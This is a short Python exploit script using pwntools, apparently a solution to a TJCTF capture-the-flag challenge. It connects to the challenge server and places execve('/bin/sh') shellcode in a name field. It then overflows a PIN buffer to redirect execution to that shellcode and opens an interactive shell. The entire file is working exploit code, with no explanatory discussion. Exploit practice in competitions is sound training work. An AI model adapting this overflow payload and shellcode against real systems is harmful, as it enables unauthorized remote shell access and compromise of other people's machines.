from pwn import *

# context.log_level = 'debug'
# context.binary = './problem'

# sh = process('./problem')
sh = remote('problem1.tjctf.org', 8005)

name_addr = 0x006010a0

PIN = '1234'

# from https://www.exploit-db.com/exploits/36858/
shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

payload = 'a'*(5+4) + 'b'*8 + p64(name_addr)

sh.sendlineafter('Name: ', shellcode)
sh.sendlineafter('PIN: ', PIN)

sh.sendlineafter('q - quit\n', 'd')
sh.sendlineafter('PIN: ', payload)

sh.interactive()

